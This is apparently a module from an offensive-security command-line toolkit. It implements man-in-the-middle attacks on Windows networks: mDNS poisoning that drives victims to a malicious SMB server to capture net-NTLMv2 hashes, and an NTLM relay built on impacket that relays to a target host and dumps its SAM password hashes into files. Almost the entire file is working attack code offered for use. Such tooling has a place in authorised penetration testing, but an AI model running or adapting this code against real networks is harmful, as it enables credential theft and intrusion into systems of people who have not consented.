from cmd2.command_definition import with_default_category
from cmd2 import CommandSet, with_default_category, Cmd2ArgumentParser, with_argparser
import argparse

from .servers import MaliciousSmbServer, SmbRelayServer, Proxy
from impacket.examples.ntlmrelayx.clients.smbrelayclient import SMBRelayClient
from impacket.examples.ntlmrelayx.attacks.smbattack import SMBAttack
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from .Poison import MDNS
from multiprocessing import Process
from threading import Thread
import sys
import os
import signal
from cmd2 import ansi
import cmd2
import logging
from loguru import logger
from time import sleep
from json import loads
import shutil

try:
    from urllib.request import ProxyHandler, build_opener, Request
except ImportError:
    from urllib2 import ProxyHandler, build_opener, Request


@with_default_category("Man in the middle attacks")
class SmbServerAttack(CommandSet):
    """[ Class containing smbrelay attack ]"""

    def __init__(self) -> None:

        super().__init__()

    def config_poison_and_server(
        self, mdns_poisoner: MDNS, smbserver: MaliciousSmbServer
    ) -> None:
        """[ Function to launch the threads that will control the mdns poisoner and the smb server]

        Args:
            mdns_poisoner (MDNS): [ variable with the mdns poisoner Object ]
            smbserver (SmbServer): [ variable with the SmbServer Object ]
        """
        mdns_thread = Thread(target=mdns_poisoner.start_mdns_poisoning)
        mdns_thread.daemon = True

        smbserver_thread = Thread(target=smbserver.start_malicious_smbserver)
        smbserver_thread.daemon = True

        mdns_thread.start()
        smbserver_thread.start()

        # I only wait for a thread because when you finish the process you have to finish
        smbserver_thread.join()

    argParser = Cmd2ArgumentParser(
        description="""Malicious smb server attack to get hashes net-NTLMV """
    )
    argParser.add_argument(
        "-SS",
        "--show_settable",
        action="store_true",
        help="Show Settable variables for this command",
    )

    @with_argparser(argParser)
    def do_mss(self, args: argparse.Namespace) -> None:
        """[ Command to create a malicious smb server to get ntlm hashes ]

        Args:
            args (argparse.Namespace): [Arguments passed to the smb_relay command]
        """

        mdns_poisoner = MDNS(
            self._cmd.LHOST,
            self._cmd.IPV6,
            self._cmd.MAC_ADDRESS,
            self._cmd.INTERFACE,
        )

        # output in case of -SS command
        smbserver = MaliciousSmbServer(self._cmd.LHOST, self._cmd.LPORT)

        self._cmd.info_logger.debug(
            f"""Starting malicious smb server attack using ip: {self._cmd.LHOST} ipv6:{self._cmd.IPV6}
            interface: {self._cmd.INTERFACE} mac_address:{self._cmd.MAC_ADDRESS} lport:{self._cmd.LPORT}"""
        )

        settable_variables_required = {
            "LHOST": self._cmd.LHOST,
            "IPV6": self._cmd.IPV6,
            "INTERFACE": self._cmd.INTERFACE,
            "MAC_ADDRESS": self._cmd.MAC_ADDRESS,
            "LPORT": self._cmd.LPORT,
        }
        if args.show_settable:
            self._cmd.show_settable_variables_necessary(settable_variables_required)
        elif self._cmd.check_settable_variables_value(settable_variables_required):

            attack = Process(
                target=self.config_poison_and_server, args=(mdns_poisoner, smbserver)
            )
            try:
                # If ctrl+c then the process terminate and smb_relay exits
                attack.start()
            except KeyboardInterrupt:
                attack.terminate()
                attack.join()
                self._cmd.error_logger.warning("Exiting smb relay attack ...")


@with_default_category("Man in the middle attacks")
class NtlmRelay(CommandSet):
    def __init__(self):
        super().__init__()
        self.__mdns_poisoner = None
        self.__smb_relay_server = None
        self.__ntlm_relay_process = None
        self.__attacks = {"SMB": SMBAttack}
        self.__clients = {"SMB": SMBRelayClient}
        self.__config = None

    @property
    def mdns_poisoner(self) -> MDNS:
        return self.__mdns_poisoner

    @property
    def smb_relay_server(self) -> SmbRelayServer:
        return self.__smb_relay_server

    @mdns_poisoner.setter
    def mdns_poisoner(self, poisoner: MDNS) -> None:
        self.__mdns_poisoner = poisoner

    @smb_relay_server.setter
    def ntlm_relay_attack(self, attack: SmbRelayServer) -> None:
        self.__smb_relay_server = attack

    def try_exit(self, signum, frame):
        self._cmd.info_logger.debug("Block exit ...")

    def launch_necessary_components(self, args: argparse.Namespace) -> None:
        """[ Function to launch the threads that will control the mdns poisoner and the smb server]

        Args:
            mdns_poisoner (MDNS): [ variable with the mdns poisoner Object ]
            smbserver (SmbServer): [ variable with the SmbServer Object ]
        """
        if not self.__check_directory(args.output_sam):
            self._cmd.error_logger.warning(
                "The specified directory does not exists or you don't have access"
            )
            return
        elif args.output_sam != ".":
            move_sam_result = Thread(
                target=self.__store_sam_results_of_target, args=(args, os.getcwd())
            )
            move_sam_result.daemon = True
            move_sam_result.start()

        if args.proxy:
            Proxy()

        if args.Asynchronous:
            self.mdns_poisoner.logger_level = "DEBUG"
            signal.signal(signal.SIGINT, self.try_exit)
        mdns_thread = Thread(target=self.mdns_poisoner.start_mdns_poisoning)
        mdns_thread.daemon = True

        mdns_thread.start()
        self.__smb_relay_server.start_smb_relay_server()

    def synchronous_attack(self):
        try:
            self.__ntlm_relay_process.join()
        except KeyboardInterrupt:
            self.__ntlm_relay_process.terminate()
            self.__ntlm_relay_process.join()
            self._cmd.error_logger.warning("Exiting smb relay attack ...")

    def asynchronous_attack(self) -> None:
        self._cmd.disable_command(
            "ntlm_relay",
            ansi.style(
                "The ntlm_relay command will be disabled while it is running",
                fg=ansi.fg.bright_yellow,
            ),
        )
        saved_file = ansi.style("logs/ntlm_relay.log", fg=ansi.fg.green)
        self._cmd.info_logger.info(
            f"Running ntlm relay on the background the results will be saved at: {saved_file} "
        )

    def configure_ntlm_relay_attack(self):
        target = TargetsProcessor(
            singleTarget=self._cmd.RHOST,
            protocolClients=self.__clients,
        )
        self.__config = NTLMRelayxConfig()
        self.__config.setMode("RELAY")
        self.__config.target = target
        self.__config.setAttacks(self.__attacks)
        self.__config.setProtocolClients(self.__clients)
        self.__config.setSMB2Support(True)
        self.__config.interfaceIp = self._cmd.LHOST

    def __store_sam_results_of_target(
        self, args: argparse.Namespace, actual_dir: str
    ) -> None:
        while True:
            output_dir = args.output_sam
            file_name = f"{self._cmd.RHOST}_samhashes.sam"
            try:
                os.rename(f"{actual_dir}/{file_name}", f"{output_dir}/{file_name}")
                os.replace(f"{actual_dir}/{file_name}", f"{output_dir}/{file_name}")
                shutil.move(f"{actual_dir}/{file_name}", f"{output_dir}/{file_name}")
            except FileNotFoundError:
                pass

    def __check_directory(self, directory: str) -> bool:
        return os.path.isdir(directory) and os.access(
            directory, os.X_OK | os.W_OK
        )  # Executing and wirte

    argParser = Cmd2ArgumentParser(
        description="""Command to perform ntlm relay attack"""
    )
    argParser.add_argument(
        "-SS",
        "--show_settable",
        action="store_true",
        help="Show Settable variables for this command",
    )
    argParser.add_argument(
        "-A",
        "--Asynchronous",
        action="store_true",
        help="Perform the attack in the background. The results will be saved in log/ntlm_relay",
    )

    argParser.add_argument(
        "-P",
        "--proxy",
        action="store_true",
        help="Use a proxy server",
    )
    argParser.add_argument(
        "-OS",
        "--output_sam",
        action="store",
        default=".",
        help="Use a proxy server",
    )

    @with_argparser(argParser)
    def do_ntlm_relay(self, args: argparse.Namespace) -> None:
        """[ Command to perform ntlm relay attack ]

        Args:
            args (argparse.Namespace): [Arguments passed to the ntlm relay attack ]
        """

        self.__mdns_poisoner = MDNS(
            self._cmd.LHOST,
            self._cmd.IPV6,
            self._cmd.MAC_ADDRESS,
            self._cmd.INTERFACE,
        )

        self.configure_ntlm_relay_attack()
        # output in case of -SS command
        self.__smb_relay_server = SmbRelayServer(args.Asynchronous, self.__config)

        self._cmd.info_logger.debug(
            f"""Starting ntlm relay attack using lhost: {self._cmd.LHOST} rhost:{self._cmd.RHOST} ipv6:{self._cmd.IPV6}
            interface: {self._cmd.INTERFACE} mac_address:{self._cmd.MAC_ADDRESS} lport:{self._cmd.LPORT}"""
        )

        settable_variables_required = {
            "LHOST": self._cmd.LHOST,
            "RHOST": self._cmd.RHOST,
            "IPV6": self._cmd.IPV6,
            "INTERFACE": self._cmd.INTERFACE,
            "MAC_ADDRESS": self._cmd.MAC_ADDRESS,
            "LPORT": self._cmd.LPORT,
        }
        if args.show_settable:
            self._cmd.show_settable_variables_necessary(settable_variables_required)
        elif self._cmd.check_settable_variables_value(settable_variables_required):

            self.__ntlm_relay_process = Process(
                target=self.launch_necessary_components, args=(args,)
            )
            self.__ntlm_relay_process.start()
            if not args.Asynchronous:
                self.synchronous_attack()
            else:
                self.asynchronous_attack()
                sleep(1)

    argParser = Cmd2ArgumentParser(description="Command to show actual connections")

    def do_show_connections(self, args: argparse.Namespace) -> None:
        url = "http://localhost:9090/ntlmrelayx/api/v1.0/relays"
        try:
            handler = ProxyHandler({})
            open_handler = build_opener(handler)
            response = Request(url)
            read_response = open_handler.open(response)
            items_from_response = loads(read_response)
            print(items_from_response)
        except Exception:
            self._cmd.error_logger.error("Error when opening connections")

    argParser = Cmd2ArgumentParser(
        description="""Command to stop ntlm relay attack in the background"""
    )

    def do_finish_ntlm_relay(self, args: argparse.Namespace) -> None:
        if self.__ntlm_relay_process is not None and self.__ntlm_relay_process.is_alive:
            self._cmd.info_logger.success(
                "Finishing ntlm relay attack in the background ..."
            )
            self.__ntlm_relay_process.terminate()
            self.__ntlm_relay_process.join()
            self._cmd.enable_command("ntlm_relay")
            self.__ntlm_relay_process = None
        else:
            self._cmd.error_logger.error(
                "There is not ntlm_relay process in the background"
            )

    def ntlm_relay_postloop(self) -> None:
        if self.__ntlm_relay_process is not None and self.__ntlm_relay_process.is_alive:
            self.__ntlm_relay_process.terminate()
            self.__ntlm_relay_process.join()
